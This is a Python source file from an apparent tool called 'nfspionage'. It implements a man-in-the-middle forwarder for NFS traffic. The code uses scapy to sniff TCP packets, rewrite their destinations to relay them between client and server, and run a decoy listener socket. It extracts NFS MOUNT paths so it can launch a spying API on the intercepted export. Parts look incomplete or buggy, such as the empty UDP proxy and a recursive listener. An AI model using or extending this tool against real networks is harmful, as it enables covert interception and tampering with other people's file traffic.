import _thread
import ipaddress
import socket
import threading

from helpers import print_console, print_exception
from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sr1

'''
# ==============================================================================
# MITM FORWARDER ===============================================================
# ==============================================================================
'''


class MitmForwarder:
	server_address = None
	spoof_address = None
	target_port = None

	client_address = None
	mount_ports = []

	def __init__(self, remote_ip, port, udp=False):
		self.server_address = remote_ip
		self.target_port = port
		self.spoof_address = remote_ip
		print_console("// ========================================")
		print_console("// Starting MitmForwarder", trailing_dots=True)
		print_console("// [*] LOC Addr:\t127.0.0.1:" + str(port))
		print_console("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
		if udp:
			print_console("// [*] PROT:\t\tUDP")
			self.udp_proxy()
		else:
			print_console("// [*] PROT:\t\tTCP")
			self.tcp_proxy()
		print("// ========================================")

	def update_client_address(self, packet):
		if packet[IP].src is not self.server_address:
			self.client_address = packet[IP].src

	# ======================================================== #
	# ==================== TCP FORWARDING ==================== #
	# ======================================================== #
	# tcp_proxy ============================================== #
	# create tcp servers to listen for and forward connections to target
	def tcp_proxy(self):
		print_console("// tcp_proxy ====================================")

		# create thread for python socket to "accept" messages
		threading.Thread(target=self.tcp_listen, args=(self.target_port,)).start()

		# listen with scapy to actually forward and process
		str_filter = "tcp and port " + str(self.target_port)
		print_console("FILTER: " + str(str_filter))
		print_console("STARTING scapy packet sniffing", trailing_dots=True)
		sniff(count=0, filter=str_filter, prn=self.transfer_tcp)
		print_console("STOPPING scapy packet sniffing")
		print_console("// END tcp_proxy ====================================")

	# transfer_tcp ============================================== #
	# scapy sniff callback function to filter and modify incoming packets
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# void
	def transfer_tcp(self, pkt):
		if IP in pkt:  # only process packets with IP layer
			# pkt.show()

			# try to filter
			try:
				self.filter_packets(pkt)
			except Exception as e:
				print_exception("Filtering packet: " + str(e))

			# fix check sums
			pkt[IP].checksum = None  # ask scapy to regenerate
			src_ether = pkt[Ether].src
			if Ether in pkt:
				pkt[Ether].src = None
				pkt[Ether].dst = None
				pkt[Ether].checksum = None  # ask scapy to regenerate it
			pkt[Ether].src = src_ether

			# change src and dst IP appropriately
			self.update_client_address(pkt)
			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to server
				# pkt[IP].src = hex(int(ipaddress.IPv4Address(self.client_address)))
				pkt[IP].dst = str(ipaddress.IPv4Address(self.server_address))
			else:  # packets is from server -> forward to client
				# pkt[IP].src = hex(int(ipaddress.IPv4Address(self.server_address)))
				pkt[IP].dst = str(ipaddress.IPv4Address(self.client_address))

			# send packet
			# pkt.show()
			print_console("FORWARDING to " + str(pkt[IP].dst), trailing_dots=True)
			sr1(pkt)

	# tcp_listen ============================================== #
	# create tcp listener on passed host and port, needed so that other hosts
	# see a 'real program' running on this port
	# PARAM
	# host (str)    - host to create socket on
	# port (int)    - port to create socket on
	# RETURN
	# void
	def tcp_listen(self, port):
		print_console("LISTEN STARTING: " + str(port), tag="TCP", trailing_dots=True)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(('', port))
		sock.listen()
		while True:  # listen forever
			# msg rcvd -> call this func again to try to create another "client" socket on that port
			connection, client_address = sock.accept()
			print_console("CONNECTION on " + str(client_address), tag="TCP")
			self.tcp_listen(client_address[1])

	# ======================================================== #
	# ==================== UDP FORWARDING ==================== #
	# ======================================================== #

	# udp_proxy ============================================== #
	# create udp servers to listen for and forward connections to target
	def udp_proxy(self):
		pass

	# ========================================================== #
	# ==================== PACKET FILTERING ==================== #
	# ========================================================== #

	# filter_packets =========================================== #
	# filter packets for data of interest - i.e., mount port
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# void
	def filter_packets(self, pkt):
		# filter path, start mitm API
		path = self.filter_mount_path(pkt)
		if path != -1:  # if proper mount path, start API on path for clients
			print_console("starting NFS MITM API on path \'" + path + "\'", trailing_dots=True)
			_thread.start_new_thread(NfspionageApi, (self.server_address, path))

	# filter_mount_path =========================================== #
	# filter mount path out of packet
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# str       - mount path
	# -1        - ERROR
	@staticmethod
	def filter_mount_path(pkt):
		try:  # try to convert to MOUNT_Call packet
			mnt_pkt = RPC(MOUNT_Call(raw(pkt)))
			path = mnt_pkt.path.path.decode('utf-8')
			print_console("MOUNT on path " + path)
			return path
		except Exception as e:  # error getting mount path
			# print("[- EXP ] " + str(e))
			return -1
